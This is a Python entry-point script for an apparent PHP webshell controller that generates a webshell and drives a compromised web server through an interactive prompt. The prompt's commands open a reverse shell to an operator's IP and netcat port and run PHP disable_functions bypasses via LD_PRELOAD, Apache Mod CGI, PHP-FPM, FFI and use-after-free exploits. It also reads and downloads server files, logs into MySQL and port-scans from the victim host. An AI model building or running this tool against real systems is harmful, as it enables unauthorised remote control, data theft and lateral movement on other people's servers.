import argparse

from INFO.info import INFO
from test import Test
from ways.Ways import  webshell
from Result.result import results
parser = argparse.ArgumentParser()
parser.add_argument('--pwd',help="please input the password for your shell")
parser.add_argument('--url',help="please input the url for you want")
parser.add_argument('--way',help="please input the way GET-or-POST")
parser.add_argument('--shell',help="create a so nice webshell")
args = parser.parse_args()
banner="""
     _          _ _       _                _    
 ___| |__   ___| | |     | |__   __ _  ___| | __
/ __| '_ \ / _ \ | |_____| '_ \ / _` |/ __| |/ /
\__ \ | | |  __/ | |_____| | | | (_| | (__|   < 
|___/_| |_|\___|_|_|     |_| |_|\__,_|\___|_|\_\/
"""
banners = banner+"\n-----author : s1mple && SUer && Water Paddler-----"

if(args.shell):
    shell = args.shell.lower()
    pwd = args.pwd
    if(shell=="create"):
        pwd = pwd
        print(results().shell(pwd))
        exit()
elif(not args.url or not args.pwd or not args.way):
    print("\033[0;36m"+banner)
    parser.print_help()
    exit()
print("\033[0;36m"+banners)
urls = args.url  # str
way = args.way.lower()
pwd = args.pwd

if ("https" in urls):
    url = urls[8:]
else:
    url = urls[7:]

cmd =''
info = INFO(url,pwd,cmd,way)
test = Test(way,url,pwd,cmd)
res = test.test()
getshell = webshell(url, pwd, cmd, way)
if(res=="true"):
    while True:
        cmd = input("\033[0;32m[Shell-controller]\033[0;35m[probe]\033[0m\033[0m$ ")
        if(cmd==''):
            continue
        if (cmd == "exit"):
            break
        if(cmd == "get info"):
            info.Printinfo()
        if(cmd =="reshell"):
            ip = input("input your server ip:")
            port = input("input your nc port:")
            getshell.reverse_shell(port,ip,cmd)
        if(cmd=="bypass"):
            print("=>you can use:")
            print("=>bypass preload")
            print("=>bypass Apache Mod CGI")
            print("=>bypass PHP-FPM")
            print("=>bypass GC UAF")
            print("=>bypass FFI expand")
            print("=>bypass Json Serializer UAF")
            print("=>bypass Backtrace UAF")
        if(cmd=="bypass Backtrace UAF"):
            getshell.bypass_by_pwn(cmd)
        if(cmd=="bypass Json Serializer UAF"):
            getshell.bypass_by_pwn(cmd)
        if (cmd == "bypass GC UAF"):
            getshell.bypass_by_pwn(cmd)
        if(cmd=="bypass preload"):
            getshell.bypass_PRELOAD()
        if(cmd=="bypass Apache Mod CGI"):
            getshell.bypass_Apache_Mod_CGI()
        if(cmd=="bypass PHP-FPM"):
            getshell.bypass_php_fpm()
        if(cmd=="bypass FFI expand"):
            getshell.bypass_php_ffi()
        if(cmd=="mysql"):
            username = input("please input you username : ")
            password = input("please input your password : ")
            getshell.exec_sql(username,password)
        if(cmd=="downfile"):
            path = input("please input the file you want(file-path+name): ")
            name = input("please input the name you want to save: ")
            result = getshell.down_load_file(path,name)
            print(result)

        if(cmd=="readfile"):
            path = input("please input the file path: ")
            filecontents = getshell.readfile(path)
            print("\n"+filecontents)
        if (cmd == "portscan"):
            ip = input("please input the ip you want to test: ")
            result = getshell.phpportscan(ip)
            if(result=="false"):
                print("remote server php scan is faild")
                print("new you use the location python to test the port;so ip should be the remote ip")
                port = input("please input the port that you want to scan")
                result = test.portscan(ip,port)
            print("\n" + result)

        result = getshell.connectionToresult(cmd)
        if(result==''):
            print("result is None;The website has some WAF some function is baned;please look the function you can use")
        if(cmd != ''):
            print(result.replace("&lt;","<").replace("&gt;",">").replace("&#039;","\'").replace("&#34;","\""))
